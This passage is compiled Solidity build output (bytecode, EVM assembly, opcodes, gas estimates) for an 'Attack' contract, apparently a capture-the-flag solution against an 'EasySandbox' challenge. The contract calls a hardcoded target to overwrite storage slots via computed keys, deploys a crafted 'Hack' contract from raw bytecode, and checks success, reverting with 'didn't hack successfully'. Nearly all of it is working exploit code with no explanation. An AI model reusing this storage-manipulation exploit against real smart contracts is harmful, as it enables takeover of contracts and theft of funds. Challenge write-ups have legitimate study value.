0x6000805560016101007f36306db541fd1551fd93a60031e8a8c89d69ddef41d6\n            /* \"EasySandBox/Attack.sol\":3849:3850  0 */\n          0x00\n            /* \"EasySandBox/Attack.sol\":3842:3919  mstore(0, 0x6000805560016101007f36306db541fd1551fd93a60031e8a8c89d69ddef41d6) */\n          mstore\n            /* \"EasySandBox/Attack.sol\":3945:4011  0x249f5fdc265dbc8ffea20155327f34a2b38493519efd2aea7c8727c9ed8774c9 */\n          0x249f5fdc265dbc8ffea20155327f34a2b38493519efd2aea7c8727c9ed8774c9\n            /* \"EasySandBox/Attack.sol\":3939:3943  0x20 */\n          0x20\n            /* \"EasySandBox/Attack.sol\":3932:4012  mstore(0x20, 0x249f5fdc265dbc8ffea20155327f34a2b38493519efd2aea7c8727c9ed8774c9) */\n          mstore\n            /* \"EasySandBox/Attack.sol\":4038:4104  0x6c96418d940632b22aa9df022106556132fe6001013452346002601e3031f500 */\n          0x6c96418d940632b22aa9df022106556132fe6001013452346002601e3031f500\n            /* \"EasySandBox/Attack.sol\":4032:4036  0x40 */\n          0x40\n            /* \"EasySandBox/Attack.sol\":4025:4105  mstore(0x40, 0x6c96418d940632b22aa9df022106556132fe6001013452346002601e3031f500) */\n          mstore\n            /* \"EasySandBox/Attack.sol\":4128:4132  0x5f */\n          0x5f\n            /* \"EasySandBox/Attack.sol\":4125:4126  0 */\n          0x00\n            /* \"EasySandBox/Attack.sol\":4118:4133  return(0, 0x5f) */\n          return\n        stop\n\n        sub_0: assembly {\n                /* \"EasySandBox/Attack.sol\":2633:4151  contract Hack {... */\n              mstore(0x40, 0x80)\n              0x00\n              dup1\n              revert\n\n            auxdata: 0xa265627a7a72315820086c47a3178369d613a19ea7e468f126f526c1baa900ab6d8a991451e1b2d2c464736f6c63430005110032\n        }\n    }\n\n    auxdata: 0xa265627a7a72315820b5305c5f667a61f190f72095099e94618b904a90720732da33a205eaeb1c45f464736f6c63430005110032\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052735fd6eb55d12e759a21c09ef703fe0cba1dc9d88d6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b506106cb806100746000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c8063603a9aec146100465780636414862f146100a85780639e5faafc146100ea575b600080fd5b6100926004803603604081101561005c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506100f4565b6040518082815260200191505060405180910390f35b6100d4600480360360208110156100be57600080fd5b8101908080359060200190929190505050610149565b6040518082815260200191505060405180910390f35b6100f261017c565b005b60008273ffffffffffffffffffffffffffffffffffffffff1660001b8260001b604051602001808381526020018281526020019250505060405160208183030381529060405280519060200120905092915050565b60008160001b60405160200180828152602001915050604051602081830303815290604052805190602001209050919050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381600087803b1580156101e757600080fd5b505af11580156101fb573d6000803e3d6000fd5b505050506040513d602081101561021157600080fd5b8101908080519060200190929190505050905060006102318260016100f4565b90506000816040516020018082815260200191505060405160208183030381529060405280519060200120905060007fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff905060007f290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e5639050600060018284030190506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635e08b9d56002848860001c036040518363ffffffff1660e01b81526004018083815260200182815260200192505050600060405180830381600087803b15801561033457600080fd5b505af1158015610348573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635e08b9d53073ffffffffffffffffffffffffffffffffffffffff166001858860001c03016040518363ffffffff1660e01b81526004018083815260200182815260200192505050600060405180830381600087803b1580156103e657600080fd5b505af11580156103fa573d6000803e3d6000fd5b50505050600060405161040c90610607565b604051809103906000f080158015610428573d6000803e3d6000fd5b5090506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c94103b1826040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b1580156104cb57600080fd5b505af11580156104df573d6000803e3d6000fd5b50505050600115156000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166364d98f6e6040518163ffffffff1660e01b815260040160206040518083038186803b15801561054e57600080fd5b505afa158015610562573d6000803e3d6000fd5b505050506040513d602081101561057857600080fd5b81019080805190602001909291905050501515146105fe576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260188152602001807f6469646e2774206861636b207375636365737366756c6c79000000000000000081525060200191505060405180910390fd5b50505050505050565b6083806106148339019056fe6080604052348015600f57600080fd5b507f6000805560016101007f36306db541fd1551fd93a60031e8a8c89d69ddef41d66000527f249f5fdc265dbc8ffea20155327f34a2b38493519efd2aea7c8727c9ed8774c96020527f6c96418d940632b22aa9df022106556132fe6001013452346002601e3031f500604052605f6000f3fea265627a7a72315820b5305c5f667a61f190f72095099e94618b904a90720732da33a205eaeb1c45f464736f6c63430005110032",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x5FD6EB55D12E759A21C09EF703FE0CBA1DC9D88D PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x64 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6CB DUP1 PUSH2 0x74 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x603A9AEC EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x6414862F EQ PUSH2 0xA8 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xEA JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x92 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x5C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xF4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xD4 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xBE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x149 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xF2 PUSH2 0x17C JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 SHL DUP3 PUSH1 0x0 SHL PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP4 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0x0 SHL PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x8DA5CB5B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1E7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1FB JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x211 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP SWAP1 POP PUSH1 0x0 PUSH2 0x231 DUP3 PUSH1 0x1 PUSH2 0xF4 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 DUP2 PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 SWAP1 POP PUSH1 0x0 PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 POP PUSH1 0x0 PUSH32 0x290DECD9548B62A8D60345A988386FC84BA6BC95484008F6362F93160EF3E563 SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 DUP5 SUB ADD SWAP1 POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x5E08B9D5 PUSH1 0x2 DUP5 DUP9 PUSH1 0x0 SHR SUB PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x334 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x348 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x5E08B9D5 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 DUP6 DUP9 PUSH1 0x0 SHR SUB ADD PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP4 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD PUSH2 0x40C SWAP1 PUSH2 0x607 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x428 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC94103B1 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4DF JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x1 ISZERO ISZERO PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x64D98F6E PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x54E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x562 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x578 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP ISZERO ISZERO EQ PUSH2 0x5FE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x18 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x6469646E2774206861636B207375636365737366756C6C790000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x83 DUP1 PUSH2 0x614 DUP4 CODECOPY ADD SWAP1 JUMP INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH32 0x6000805560016101007F36306DB541FD1551FD93A60031E8A8C89D69DDEF41D6 PUSH1 0x0 MSTORE PUSH32 0x249F5FDC265DBC8FFEA20155327F34A2B38493519EFD2AEA7C8727C9ED8774C9 PUSH1 0x20 MSTORE PUSH32 0x6C96418D940632B22AA9DF022106556132FE6001013452346002601E3031F500 PUSH1 0x40 MSTORE PUSH1 0x5F PUSH1 0x0 RETURN INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xB5 ADDRESS 0x5C 0x5F PUSH7 0x7A61F190F72095 MULMOD SWAP15 SWAP5 PUSH2 0x8B90 0x4A SWAP1 PUSH19 0x732DA33A205EAEB1C45F464736F6C63430005 GT STOP ORIGIN "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "347800",
						"executionCost": "21253",
						"totalCost": "369053"
					},
					"external": {
						"attack()": "infinite",
						"calculateKey(address,uint256)": "490",
						"calculateSlot(uint256)": "436"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"calculateKey(address,uint256)": "603a9aec",
					"calculateSlot(uint256)": "6414862f"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 277,
						"contract": "EasySandBox/Attack.sol:Attack",
						"label": "easySandbox",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IEasySandbox)272"
					}
				],
				"types": {
					"t_contract(IEasySandbox)272": {
						"encoding": "inplace",
						"label": "contract IEasySandbox",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}